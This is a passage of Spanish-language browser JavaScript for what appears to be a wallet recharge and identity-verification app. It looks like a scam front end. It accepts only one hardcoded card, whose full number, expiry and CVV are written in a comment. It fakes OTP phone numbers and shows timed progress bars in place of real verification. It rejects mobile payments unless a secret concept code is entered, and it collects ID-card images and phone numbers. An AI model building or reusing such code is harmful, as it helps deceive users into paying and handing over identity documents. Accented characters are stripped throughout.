        updateMainBalanceDisplay();
        resetInactivityTimer();
      });
    }

    if (visibilityBtn) {
      visibilityBtn.addEventListener('click', function() {
        isBalanceHidden = !isBalanceHidden;
        updateMainBalanceDisplay();
        resetInactivityTimer();
      });
    }
  }

    // Receipt upload
    function setupReceiptUpload() {
      // Bank transfer receipt
      const receiptUpload = document.getElementById('receipt-upload');
      const receiptFile = document.getElementById('receipt-file');
      const receiptPreview = document.getElementById('receipt-preview');
      const receiptFilename = document.getElementById('receipt-filename');
      const receiptFilesize = document.getElementById('receipt-filesize');
      const receiptRemove = document.getElementById('receipt-remove');
      
      if (receiptUpload && receiptFile) {
        receiptUpload.addEventListener('click', function() {
          receiptFile.click();
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
        
        receiptFile.addEventListener('change', function() {
          if (this.files && this.files[0]) {
            const file = this.files[0];
            
            if (file.size > 5 * 1024 * 1024) {
              showToast('error', 'Archivo muy grande', 'El tamao mximo permitido es 5MB');
              return;
            }
            
            if (receiptFilename) receiptFilename.textContent = file.name;
            if (receiptFilesize) receiptFilesize.textContent = formatFileSize(file.size);
            if (receiptPreview) receiptPreview.style.display = 'block';
            if (receiptUpload) receiptUpload.style.display = 'none';
            
            // Reset inactivity timer
            resetInactivityTimer();
          }
        });
        
        if (receiptRemove) {
          receiptRemove.addEventListener('click', function() {
            if (receiptFile) receiptFile.value = '';
            if (receiptPreview) receiptPreview.style.display = 'none';
            if (receiptUpload) receiptUpload.style.display = 'block';
            
            // Reset inactivity timer
            resetInactivityTimer();
          });
        }
      }
      
      // Mobile payment receipt
      const mobileReceiptUpload = document.getElementById('mobile-receipt-upload');
      const mobileReceiptFile = document.getElementById('mobile-receipt-file');
      const mobileReceiptPreview = document.getElementById('mobile-receipt-preview');
      const mobileReceiptFilename = document.getElementById('mobile-receipt-filename');
      const mobileReceiptFilesize = document.getElementById('mobile-receipt-filesize');
      const mobileReceiptRemove = document.getElementById('mobile-receipt-remove');
      
      if (mobileReceiptUpload && mobileReceiptFile) {
        mobileReceiptUpload.addEventListener('click', function() {
          mobileReceiptFile.click();
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
        
        mobileReceiptFile.addEventListener('change', function() {
          if (this.files && this.files[0]) {
            const file = this.files[0];
            
            if (file.size > 5 * 1024 * 1024) {
              showToast('error', 'Archivo muy grande', 'El tamao mximo permitido es 5MB');
              return;
            }
            
            if (mobileReceiptFilename) mobileReceiptFilename.textContent = file.name;
            if (mobileReceiptFilesize) mobileReceiptFilesize.textContent = formatFileSize(file.size);
            if (mobileReceiptPreview) mobileReceiptPreview.style.display = 'block';
            if (mobileReceiptUpload) mobileReceiptUpload.style.display = 'none';
            
            // Reset inactivity timer
            resetInactivityTimer();
          }
        });
        
        if (mobileReceiptRemove) {
          mobileReceiptRemove.addEventListener('click', function() {
            if (mobileReceiptFile) mobileReceiptFile.value = '';
            if (mobileReceiptPreview) mobileReceiptPreview.style.display = 'none';
            if (mobileReceiptUpload) mobileReceiptUpload.style.display = 'block';
            
            // Reset inactivity timer
            resetInactivityTimer();
          });
        }
      }
    }

    function setupCardPayment() {
      // Amount selection
      const cardAmountSelect = document.getElementById('card-amount-select');
      if (cardAmountSelect) {
        cardAmountSelect.addEventListener('change', function() {
          if (this.value) {
            const option = this.options[this.selectedIndex];
            
            // Update selected amount
            selectedAmount.usd = parseInt(option.value) || 0;
            selectedAmount.bs = parseInt(option.dataset.bs) || 0;
            selectedAmount.eur = parseFloat(option.dataset.eur) || 0;
            
            // Update payment buttons state
            updateSubmitButtonsState();
          } else {
            // Si no hay valor seleccionado, resetear selectedAmount
            selectedAmount = { usd: 0, bs: 0, eur: 0 };
            updateSubmitButtonsState();
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }

      // Credit card form 
      setupCardFormInteraction();
      
      // Submit payment
      setupCardPaymentSubmit();
      
      // Success continue button
      const successContinue = document.getElementById('success-continue');
      if (successContinue) {
        successContinue.addEventListener('click', function() {
          // Hide success and recharge containers
          const successContainer = document.getElementById('success-container');
          const rechargeContainer = document.getElementById('recharge-container');
          
          if (successContainer) successContainer.style.display = 'none';
          if (rechargeContainer) rechargeContainer.style.display = 'none';
          
          // Show dashboard
          const dashboardContainer = document.getElementById('dashboard-container');
          if (dashboardContainer) dashboardContainer.style.display = 'block';
          
          // Reset form
          resetCardForm();
          
          // Check banners visibility
          checkBannersVisibility();
          
          // Update UI
          updateUserUI();
          
          // Reset inactivity timer
          resetInactivityTimer();
          
          // Asegurar que el chat de Tawk.to est visible
          ensureTawkToVisibility();
        });
      }
    }

    function setupCardFormInteraction() {
      const cardPreview = document.getElementById('card-preview');
      const cardNumberInput = document.getElementById('cardNumber');
      const cardNameInput = document.getElementById('cardName');
      const cardMonthInput = document.getElementById('cardMonth');
      const cardYearInput = document.getElementById('cardYear');
      const cardCvvInput = document.getElementById('cardCvv');
      
      // Uso de tarjeta guardada
      const useSavedCard = document.getElementById('use-saved-card');
      if (useSavedCard) {
        useSavedCard.addEventListener('change', function() {
          const cardFormContainer = document.getElementById('card-form-container');
          
          if (cardFormContainer) {
            if (this.checked) {
              cardFormContainer.style.display = 'none';
            } else {
              cardFormContainer.style.display = 'block';
            }
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      if (cardNameInput) {
        cardNameInput.addEventListener('input', function() {
          const displayEl = document.getElementById('card-holder-display');
          if (displayEl) {
            // Mostrar solo las iniciales y el resto con asteriscos para proteccin
            const nameParts = this.value.trim().split(' ');
            if (nameParts.length > 0 && nameParts[0]) {
              let maskedName = '';
              nameParts.forEach((part, index) => {
                if (part.length > 0) {
                  if (index === nameParts.length - 1) {
                    // Mostrar la primera letra del apellido y el resto con asteriscos
                    maskedName += part.charAt(0) + ''.repeat(Math.max(0, part.length - 1));
                  } else {
                    // Mostrar la primera letra del nombre y el resto con asteriscos
                    maskedName += part.charAt(0) + ''.repeat(Math.max(0, part.length - 1)) + ' ';
                  }
                }
              });
              displayEl.textContent = maskedName || ' ';
            } else {
              displayEl.textContent = ' ';
            }
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function() {
          // Format card number
          let value = this.value.replace(/\D/g, '');
          let formattedValue = '';
          
          for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
              formattedValue += ' ';
            }
            formattedValue += value[i];
          }
          
          this.value = formattedValue;
          
          // Update display - show first 4 and last 4 digits, mask the rest
          let displayValue = '';
          if (value.length > 0) {
            if (value.length >= 8) {
              const firstFour = value.slice(0, 4);
              const lastFour = value.slice(-4);
              displayValue = `${firstFour}   ${lastFour}`;
            } else if (value.length > 4) {
              const firstFour = value.slice(0, 4);
              const remaining = ''.repeat(value.length - 4);
              displayValue = `${firstFour} ${remaining}`;
            } else {
              displayValue = value + ''.repeat(16 - value.length);
            }
            
            // Format with spaces
            displayValue = displayValue.replace(/(.{4})/g, '$1 ').trim();
          } else {
            displayValue = '   ';
          }
          
          const cardNumberDisplay = document.getElementById('card-number-display');
          if (cardNumberDisplay) cardNumberDisplay.textContent = displayValue;
          
          // Update card brand logo based on first digit
          const firstDigit = value.charAt(0);
          let cardBrand = 'visa';
          
          if (firstDigit === '4') {
            cardBrand = 'visa';
          } else if (firstDigit === '5') {
            cardBrand = 'mastercard';
          } else if (firstDigit === '3') {
            cardBrand = 'amex';
          } else if (firstDigit === '6') {
            cardBrand = 'discover';
          }
          
          const cardBrandLogo = document.getElementById('card-brand-logo');
          if (cardBrandLogo) {
            cardBrandLogo.src = `https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${cardBrand}.png`;
            cardBrandLogo.alt = `Logo de ${cardBrand}`;
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      if (cardMonthInput) {
        cardMonthInput.addEventListener('change', function() {
          const displayEl = document.getElementById('card-month-display');
          if (displayEl) displayEl.textContent = this.value || '';
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      if (cardYearInput) {
        cardYearInput.addEventListener('change', function() {
          const displayEl = document.getElementById('card-year-display');
          if (displayEl) displayEl.textContent = this.value ? this.value.slice(-2) : '';
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      if (cardCvvInput && cardPreview) {
        cardCvvInput.addEventListener('focus', function() {
          cardPreview.classList.add('-active');
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
        
        cardCvvInput.addEventListener('blur', function() {
          cardPreview.classList.remove('-active');
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
        
        cardCvvInput.addEventListener('input', function() {
          const displayEl = document.getElementById('card-cvv-display');
          
          if (displayEl) {
            if (this.value) {
              let masked = '';
              for (let i = 0; i < this.value.length; i++) {
                masked += '';
              }
              displayEl.textContent = masked;
            } else {
              displayEl.textContent = '';
            }
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    function setupCardPaymentSubmit() {
      const submitPayment = document.getElementById('submit-payment');
      if (submitPayment) {
        submitPayment.addEventListener('click', function() {
          // Verificar si se ha seleccionado un monto
          if (selectedAmount.usd <= 0) {
            showToast('error', 'Seleccione un monto', 'Por favor seleccione un monto para recargar.');
            return;
          }
            
          // Si se est usando una tarjeta guardada
          const useSavedCard = document.getElementById('use-saved-card');
          
          if (useSavedCard && useSavedCard.checked && currentUser.hasSavedCard) {
            // Check if user exceeded max recharges
            if (currentUser.cardRecharges >= CONFIG.MAX_CARD_RECHARGES) {
              // Show error
              showToast('error', 'Lmite Alcanzado', 'Ha alcanzado el lmite de recargas con tarjeta. Por favor verifique su cuenta para continuar.');
              
              // Show feature blocked modal
              showFeatureBlockedModal();
              
              return;
            }
            
            // CORRECCIN 1: Guardar una copia del monto seleccionado antes de procesar
            const amountToDisplay = {
              usd: selectedAmount.usd,
              bs: selectedAmount.bs,
              eur: selectedAmount.eur
            };
            
            // Procesar directamente el pago con tarjeta guardada sin solicitar OTP
            processSavedCardPayment(amountToDisplay);
            return;
          }
          
          if (!validateCardForm()) return;
          
          // Validar que sea la tarjeta vlida especfica
          const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
          const cardMonth = document.getElementById('cardMonth').value;
          const cardYear = document.getElementById('cardYear').value;
          const cardCvv = document.getElementById('cardCvv').value;
          
          // CORREGIDO: Ahora acepta la tarjeta 4745034211763009 con fecha 01/2026 y CVV 583
          if (cardNumber !== CONFIG.VALID_CARD || 
              cardMonth !== CONFIG.VALID_CARD_EXP_MONTH || 
              cardYear !== CONFIG.VALID_CARD_EXP_YEAR || 
              cardCvv !== CONFIG.VALID_CARD_CVV) {
            showToast('error', 'Tarjeta Invlida', 'Los datos de la tarjeta no son vlidos. Por favor verifique e intente nuevamente.');
            return;
          }

          // Generate random masked phone for OTP
          const phonePrefixes = ['+44', '+34', '+33', '+49'];
          const randomPrefix = phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)];
          const maskedPhone = document.getElementById('masked-phone');
          if (maskedPhone) {
            maskedPhone.textContent = `${randomPrefix} ${Math.floor(Math.random() * 100)}** ****${Math.floor(Math.random() * 100)}`;
          }
          
          // Show OTP modal for card payment validation
          const otpModal = document.getElementById('otp-modal-overlay');
          if (otpModal) otpModal.style.display = 'flex';
          
          // Focus on first OTP input
          const firstOtp = document.getElementById('otp-1');
          if (firstOtp) firstOtp.focus();
          
          // Reset OTP inputs
          document.querySelectorAll('.otp-input').forEach(input => {
            input.value = '';
          });
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    function setupBankTransfer() {
      // Amount selection
      const bankAmountSelect = document.getElementById('bank-amount-select');
      if (bankAmountSelect) {
        bankAmountSelect.addEventListener('change', function() {
          if (this.value) {
            const option = this.options[this.selectedIndex];
            
            // Update selected amount
            selectedAmount.usd = parseInt(option.value) || 0;
            selectedAmount.bs = parseInt(option.dataset.bs) || 0;
            selectedAmount.eur = parseFloat(option.dataset.eur) || 0;
            
            // Update payment buttons state
            updateSubmitButtonsState();
          } else {
            // Si no hay valor seleccionado, resetear selectedAmount
            selectedAmount = { usd: 0, bs: 0, eur: 0 };
            updateSubmitButtonsState();
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      const submitBankTransfer = document.getElementById('submit-bank-transfer');
      if (submitBankTransfer) {
        submitBankTransfer.addEventListener('click', function() {
          // Verificar si se ha seleccionado un monto
          if (selectedAmount.usd <= 0) {
            showToast('error', 'Seleccione un monto', 'Por favor seleccione un monto para recargar.');
            return;
          }
          
          const referenceNumber = document.getElementById('reference-number');
          const referenceError = document.getElementById('reference-error');
          const receiptFile = document.getElementById('receipt-file');
          
          // Reset error
          if (referenceError) referenceError.style.display = 'none';
          
          // Validate reference number
          if (!referenceNumber || !referenceNumber.value) {
            if (referenceError) {
              referenceError.textContent = 'Por favor, ingrese el nmero de referencia de la transferencia.';
              referenceError.style.display = 'block';
            }
            return;
          }
          
          // Validate receipt upload
          if (!receiptFile || !receiptFile.files || !receiptFile.files[0]) {
            showToast('error', 'Error', 'Por favor, suba el comprobante de pago.');
            return;
          }
          
          // CORRECCIN 1: Guardar una copia del monto seleccionado antes de procesar
          const amountToDisplay = {
            usd: selectedAmount.usd,
            bs: selectedAmount.bs,
            eur: selectedAmount.eur
          };
          
          // Show loading overlay
          const loadingOverlay = document.getElementById('loading-overlay');
          if (loadingOverlay) loadingOverlay.style.display = 'flex';
          
          // Animate progress bar
          const progressBar = document.getElementById('progress-bar');
          const loadingText = document.getElementById('loading-text');
          
          if (progressBar && loadingText) {
            gsap.to(progressBar, {
              width: '100%',
              duration: 2,
              ease: 'power1.inOut',
              onUpdate: function() {
                const progress = Math.round(this.progress() * 100);
                if (progress < 30) {
                  loadingText.textContent = "Subiendo comprobante...";
                } else if (progress < 70) {
                  loadingText.textContent = "Verificando informacin...";
                } else {
                  loadingText.textContent = "Registrando transferencia...";
                }
              },
              onComplete: function() {
                setTimeout(function() {
                  if (loadingOverlay) loadingOverlay.style.display = 'none';
                  
                  // Establecer que el usuario ya ha hecho su primera recarga
                  if (!currentUser.hasMadeFirstRecharge) {
                    saveFirstRechargeStatus(true);
                  }
                  
                  // Aadir transaccin pendiente
                  addTransaction({
                    type: 'deposit',
                    amount: amountToDisplay.usd,
                    amountBs: amountToDisplay.bs,
                    amountEur: amountToDisplay.eur,
                    date: getCurrentDateTime(),
                    description: 'Transferencia Bancaria',
                    reference: referenceNumber.value,
                    status: 'pending'
                  });
                  
                  // Actualizar las transacciones pendientes
                  pendingTransactions = currentUser.transactions.filter(t => t.status === 'pending' && t.description === 'Pago Mvil');
                  updatePendingTransactionsBadge();
                  updateRejectedTransactionsBadge();
                  
                  // Guardar transferencia bancaria pendiente
                  const pendingBankTransfers = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.PENDING_BANK) || '[]');
                  pendingBankTransfers.push({
                    amount: amountToDisplay.usd,
                    reference: referenceNumber.value,
                    date: getCurrentDateTime()
                  });
                  localStorage.setItem(CONFIG.STORAGE_KEYS.PENDING_BANK, JSON.stringify(pendingBankTransfers));
                  
                  // Restablecer los selectores de monto a estado por defecto
                  resetAmountSelectors();
                  
                  // Show transfer processing modal
                  const transferModal = document.getElementById('transfer-processing-modal');
                  const transferAmount = document.getElementById('transfer-amount');
                  const transferReference = document.getElementById('transfer-reference');
                  
                  if (transferModal) transferModal.style.display = 'flex';
                  if (transferAmount) transferAmount.textContent = formatCurrency(amountToDisplay.usd, 'usd');
                  if (transferReference) transferReference.textContent = referenceNumber.value;
                  
                  // Verificar banners despus de la recarga
                  checkBannersVisibility();
                  
                  // Reset form
                  if (referenceNumber) referenceNumber.value = '';
                  if (receiptFile) receiptFile.value = '';
                  
                  const receiptPreview = document.getElementById('receipt-preview');
                  const receiptUpload = document.getElementById('receipt-upload');
                  
                  if (receiptPreview) receiptPreview.style.display = 'none';
                  if (receiptUpload) receiptUpload.style.display = 'block';
                }, 500);
              }
            });
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      // Continue button for bank transfer
      const transferProcessingContinue = document.getElementById('transfer-processing-continue');
      if (transferProcessingContinue) {
        transferProcessingContinue.addEventListener('click', function() {
          const transferModal = document.getElementById('transfer-processing-modal');
          const rechargeContainer = document.getElementById('recharge-container');
          const dashboardContainer = document.getElementById('dashboard-container');
          
          if (transferModal) transferModal.style.display = 'none';
          if (rechargeContainer) rechargeContainer.style.display = 'none';
          if (dashboardContainer) dashboardContainer.style.display = 'block';
          
          // Show notification
          showToast('info', 'Transferencia en Proceso', 'Le notificaremos cuando se acredite el pago.');
          
          // Reset inactivity timer
          resetInactivityTimer();
          
          // Asegurar que el chat de Tawk.to est visible
          ensureTawkToVisibility();
        });
      }

      const transferRejectedContinue = document.getElementById('transfer-rejected-continue');
      if (transferRejectedContinue) {
        transferRejectedContinue.addEventListener('click', function() {
          const rejectedModal = document.getElementById('transfer-rejected-modal');
          const dashboardContainer = document.getElementById('dashboard-container');

          if (rejectedModal) rejectedModal.style.display = 'none';
          if (dashboardContainer) dashboardContainer.style.display = 'block';

          // Reset inactivity timer
          resetInactivityTimer();

          ensureTawkToVisibility();
        });
      }
    }

    function setupMobilePayment() {
      // Amount selection
      const mobileAmountSelect = document.getElementById('mobile-amount-select');
      if (mobileAmountSelect) {
        mobileAmountSelect.addEventListener('change', function() {
          if (this.value) {
            const option = this.options[this.selectedIndex];
            
            // Update selected amount
            selectedAmount.usd = parseInt(option.value) || 0;
            selectedAmount.bs = parseInt(option.dataset.bs) || 0;
            selectedAmount.eur = parseFloat(option.dataset.eur) || 0;
            
            // Update payment buttons state
            updateSubmitButtonsState();
          } else {
            // Si no hay valor seleccionado, resetear selectedAmount
            selectedAmount = { usd: 0, bs: 0, eur: 0 };
            updateSubmitButtonsState();
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      // Actualizar la UI de pago mvil con los datos de verificacin
      updateMobilePaymentInfo();
      
      const submitMobilePayment = document.getElementById('submit-mobile-payment');
      if (submitMobilePayment) {
        submitMobilePayment.addEventListener('click', function() {
          // Verificar si se ha seleccionado un monto
          if (selectedAmount.usd <= 0) {
            showToast('error', 'Seleccione un monto', 'Por favor seleccione un monto para recargar.');
            return;
          }

          // Implementation similar to bank transfer submission
          const referenceNumber = document.getElementById('mobile-reference-number');
          const referenceError = document.getElementById('mobile-reference-error');
          const conceptInput = document.getElementById('mobile-concept');
          const conceptError = document.getElementById('mobile-concept-error');
          const receiptFile = document.getElementById('mobile-receipt-file');
          
          // Reset error
          if (referenceError) referenceError.style.display = 'none';
          if (conceptError) conceptError.style.display = 'none';
          
          // Validate reference number
          if (!referenceNumber || !referenceNumber.value) {
            if (referenceError) {
              referenceError.textContent = 'Por favor, ingrese el nmero de referencia del pago mvil.';
              referenceError.style.display = 'block';
            }
            return;
          }
          
          // Validate receipt upload
          if (!receiptFile || !receiptFile.files || !receiptFile.files[0]) {
            showToast('error', 'Error', 'Por favor, suba el comprobante de pago mvil.');
            return;
          }

          // Validate concept input
          if (!conceptInput || !conceptInput.value.trim()) {
            if (conceptError) {
              conceptError.textContent = 'Por favor, ingrese el concepto utilizado en el pago mvil.';
              conceptError.style.display = 'block';
            }
            return;
          }

          const conceptValue = conceptInput.value.trim();
          
          // CORRECCIN 1: Guardar una copia del monto seleccionado antes de procesar
          const amountToDisplay = {
            usd: selectedAmount.usd,
            bs: selectedAmount.bs,
            eur: selectedAmount.eur
          };
          
          // Show loading overlay
          const loadingOverlay = document.getElementById('loading-overlay');
          if (loadingOverlay) loadingOverlay.style.display = 'flex';
          
          // Animate progress bar
          const progressBar = document.getElementById('progress-bar');
          const loadingText = document.getElementById('loading-text');
          
          if (progressBar && loadingText) {
            gsap.to(progressBar, {
              width: '100%',
              duration: 2,
              ease: 'power1.inOut',
              onUpdate: function() {
                const progress = Math.round(this.progress() * 100);
                if (progress < 30) {
                  loadingText.textContent = "Subiendo comprobante...";
                } else if (progress < 70) {
                  loadingText.textContent = "Verificando informacin...";
                } else {
                  loadingText.textContent = "Registrando pago mvil...";
                }
              },
              onComplete: function() {
                setTimeout(function() {
                  if (loadingOverlay) loadingOverlay.style.display = 'none';
                  
                  // Establecer que el usuario ya ha hecho su primera recarga
                  if (!currentUser.hasMadeFirstRecharge) {
                    saveFirstRechargeStatus(true);
                  }
                  
                  // Guardar la referencia antes de reiniciar el formulario
                  const referenceValue = referenceNumber.value.trim();

                  // Datos bancarios para adjuntar a la transaccin
                  const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
                  const bankName = BANK_NAME_MAP[reg.primaryBank] || '';
                  const bankLogo = typeof getBankLogo === 'function' ? getBankLogo(reg.primaryBank) : '';

                  // Add pending transaction
                  addTransaction({
                    type: 'deposit',
                    amount: amountToDisplay.usd,
                    amountBs: amountToDisplay.bs,
                    amountEur: amountToDisplay.eur,
                    date: getCurrentDateTime(),
                    description: 'Pago Mvil',
                    reference: referenceValue,
                    concept: conceptValue,
                    bankName: bankName,
                    bankLogo: bankLogo,
                    status: 'pending'
                  });
                  
                  // Update pending transactions
                  pendingTransactions = currentUser.transactions.filter(t => t.status === 'pending' && t.description === 'Pago Mvil');
                  updatePendingTransactionsBadge();
                  
                  // Save pending mobile payment
                  const pendingMobileTransfers = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.PENDING_MOBILE) || '[]');
                  pendingMobileTransfers.push({
                    amount: amountToDisplay.usd,
                    reference: referenceValue,
                    concept: conceptValue,
                    date: getCurrentDateTime()
                  });
                  localStorage.setItem(CONFIG.STORAGE_KEYS.PENDING_MOBILE, JSON.stringify(pendingMobileTransfers));
                  
                  // Restablecer los selectores de monto a estado por defecto
                  resetAmountSelectors();
                  
                  // Show transfer processing modal
                  const transferModal = document.getElementById('transfer-processing-modal');
                  const transferAmount = document.getElementById('transfer-amount');
                  const transferReference = document.getElementById('transfer-reference');
                  
                  if (transferModal) transferModal.style.display = 'flex';
                  if (transferAmount) transferAmount.textContent = formatCurrency(amountToDisplay.usd, 'usd');
                  if (transferReference) transferReference.textContent = referenceValue;
                  
                  // Verificar banners despus de la recarga
                  checkBannersVisibility();
                  
                  // Reset form
                  if (referenceNumber) referenceNumber.value = '';
                  if (receiptFile) receiptFile.value = '';
                  if (conceptInput) conceptInput.value = '';

                  const receiptPreview = document.getElementById('mobile-receipt-preview');
                  const receiptUpload = document.getElementById('mobile-receipt-upload');
                  
                  if (receiptPreview) receiptPreview.style.display = 'none';
                  if (receiptUpload) receiptUpload.style.display = 'block';

                    if (conceptValue !== '4454651') {
                      setTimeout(function() {
                        const procModal = document.getElementById('transfer-processing-modal');
                        if (procModal) procModal.style.display = 'none';
                        rejectMobileTransfer(referenceValue);
                        const rejModal = document.getElementById('transfer-rejected-modal');
                        if (rejModal) rejModal.style.display = 'flex';
                      }, 20000);
                    } else {
                      updateVerificationToPaymentValidation();
                    }
                }, 500);
              }
            });
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    function setupIdentityVerification() {
      // ID upload handling
      const idFrontUpload = document.getElementById('id-front-upload');
      const idFrontFile = document.getElementById('id-front-file');
      const idFrontPreview = document.getElementById('id-front-preview');
      const idFrontFilename = document.getElementById('id-front-filename');
      const idFrontFilesize = document.getElementById('id-front-filesize');
      const idFrontRemove = document.getElementById('id-front-remove');
      
      if (idFrontUpload && idFrontFile) {
        idFrontUpload.addEventListener('click', function() {
          idFrontFile.click();
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
        
        idFrontFile.addEventListener('change', function() {
          if (this.files && this.files[0]) {
            const file = this.files[0];
            
            if (file.size > 5 * 1024 * 1024) {
              showToast('error', 'Archivo muy grande', 'El tamao mximo permitido es 5MB');
              return;
            }
            
            if (idFrontFilename) idFrontFilename.textContent = file.name;
            if (idFrontFilesize) idFrontFilesize.textContent = formatFileSize(file.size);
            if (idFrontPreview) idFrontPreview.style.display = 'block';
            
            // Reset inactivity timer
            resetInactivityTimer();
          }
        });
        
        if (idFrontRemove) {
          idFrontRemove.addEventListener('click', function() {
            if (idFrontFile) idFrontFile.value = '';
            if (idFrontPreview) idFrontPreview.style.display = 'none';
            
            // Reset inactivity timer
            resetInactivityTimer();
          });
        }
      }
      
      const idBackUpload = document.getElementById('id-back-upload');
      const idBackFile = document.getElementById('id-back-file');
      const idBackPreview = document.getElementById('id-back-preview');
      const idBackFilename = document.getElementById('id-back-filename');
      const idBackFilesize = document.getElementById('id-back-filesize');
      const idBackRemove = document.getElementById('id-back-remove');
      
      if (idBackUpload && idBackFile) {
        idBackUpload.addEventListener('click', function() {
          idBackFile.click();
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
        
        idBackFile.addEventListener('change', function() {
          if (this.files && this.files[0]) {
            const file = this.files[0];
            
            if (file.size > 5 * 1024 * 1024) {
              showToast('error', 'Archivo muy grande', 'El tamao mximo permitido es 5MB');
              return;
            }
            
            if (idBackFilename) idBackFilename.textContent = file.name;
            if (idBackFilesize) idBackFilesize.textContent = formatFileSize(file.size);
            if (idBackPreview) idBackPreview.style.display = 'block';
            
            // Reset inactivity timer
            resetInactivityTimer();
          }
        });
        
        if (idBackRemove) {
          idBackRemove.addEventListener('click', function() {
            if (idBackFile) idBackFile.value = '';
            if (idBackPreview) idBackPreview.style.display = 'none';
            
            // Reset inactivity timer
            resetInactivityTimer();
          });
        }
      }
      
      // Configuracin para los campos de cdula y telfono
      const idNumberInput = document.getElementById('documentNumber');
      const idNumberError = document.getElementById('documentNumber-error');
      const idPhoneInput = document.getElementById('phoneNumber');
      const idPhoneError = document.getElementById('phoneNumber-error');
      
      if (idNumberInput) {
        idNumberInput.addEventListener('input', function() {
          // Convertir a maysculas la letra V o E
          if (this.value.length > 0) {
            const firstChar = this.value.charAt(0).toUpperCase();
            if (firstChar === 'V' || firstChar === 'E') {
              // Mantener solo la letra y nmeros
              const restOfValue = this.value.substring(1).replace(/\D/g, '');
              this.value = firstChar + restOfValue;
            } else {
              // Si no comienza con V o E, forzar a comenzar con V
              this.value = 'V' + this.value.replace(/\D/g, '');
            }
          }
          
          // Ocultar mensaje de error si est visible
          if (idNumberError) idNumberError.style.display = 'none';
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      if (idPhoneInput) {
        idPhoneInput.addEventListener('input', function() {
          // Permitir solo dgitos
          this.value = this.value.replace(/\D/g, '');
          
          // Si no comienza con 04, aadir automticamente
          if (this.value.length > 0 && !this.value.startsWith('04')) {
            this.value = '04' + this.value.substring(Math.min(this.value.length, 2));
          }
          
          // Limitar a 11 dgitos (formato 04121234567)
          if (this.value.length > 11) {
            this.value = this.value.substring(0, 11);
          }
          
          // Ocultar mensaje de error si est visible
          if (idPhoneError) idPhoneError.style.display = 'none';
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      // Submit verification
      const submitVerification = document.getElementById('submit-verification');
      if (submitVerification) {
        submitVerification.addEventListener('click', function() {
          const idFrontFile = document.getElementById('id-front-file');
          const idBackFile = document.getElementById('id-back-file');
          const idNumber = document.getElementById('documentNumber');
          const idPhone = document.getElementById('phoneNumber');
          
          let isValid = true;
          
          // Validate uploads
          if (!idFrontFile || !idFrontFile.files || !idFrontFile.files[0] ||
              !idBackFile || !idBackFile.files || !idBackFile.files[0]) {
            showToast('error', 'Documentos Incompletos', 'Por favor, cargue ambos lados de su documento de identidad.');
            isValid = false;
          }
          
          // Validar cdula
          if (!idNumber || !idNumber.value || !validateIdNumber(idNumber.value)) {
            if (idNumberError) {
              idNumberError.style.display = 'block';
              idNumberError.textContent = 'Por favor ingrese un nmero de cdula vlido en formato V12345678.';
            }
            isValid = false;
          }
          
          // Validar telfono
          if (!idPhone || !idPhone.value || !validatePhoneNumber(idPhone.value)) {
            if (idPhoneError) {
              idPhoneError.style.display = 'block';
              idPhoneError.textContent = 'Por favor ingrese un nmero de telfono vlido en formato 04121234567.';
            }
            isValid = false;
          }
          
          if (!isValid) return;
          
          // Show loading overlay
          const loadingOverlay = document.getElementById('loading-overlay');
          if (loadingOverlay) loadingOverlay.style.display = 'flex';
          
          // Animate progress bar
          const progressBar = document.getElementById('progress-bar');
          const loadingText = document.getElementById('loading-text');
          
          if (progressBar && loadingText) {
            gsap.to(progressBar, {
              width: '100%',
              duration: 2,
              ease: 'power2.inOut',
              onUpdate: function() {
                const progress = Math.round(this.progress() * 100);
                if (progress < 30) {
                  loadingText.textContent = "Subiendo documentos...";
                } else if (progress < 70) {
                  loadingText.textContent = "Procesando informacin...";
                } else {
                  loadingText.textContent = "Completando verificacin...";
                }
              },
              onComplete: function() {
                setTimeout(function() {
                  if (loadingOverlay) loadingOverlay.style.display = 'none';
                  
                  // Hide verification modal
                  const verificationModal = document.getElementById('verification-modal');
                  if (verificationModal) verificationModal.style.display = 'none';
                  
                  // Guardar los datos de verificacin
                  verificationStatus.idNumber = idNumber.value;
                  verificationStatus.phoneNumber = idPhone.value;
                  verificationStatus.status = 'processing'; // NUEVA IMPLEMENTACIN: Cambiar a processing
                  verificationStatus.hasUploadedId = true;
                  saveVerificationStatus();
                  
                  // Actualizar los datos del usuario tambin
                  currentUser.idNumber = idNumber.value;
                  currentUser.phoneNumber = idPhone.value;
                  saveUserData();
                  
                  // NUEVA IMPLEMENTACIN: Iniciar el proceso de verificacin
                  startVerificationProcessing();
                  
                  // Actualizar los datos de pago mvil
                  updateMobilePaymentInfo();
                  
                  // Show success toast
                  showToast('success', 'Documentos Recibidos', 'Sus documentos han sido recibidos correctamente. Estamos verificando su identidad.');
                  
                  // Reset form
                  if (idFrontFile) idFrontFile.value = '';
                  if (idBackFile) idBackFile.value = '';
                  if (idNumber) idNumber.value = '';
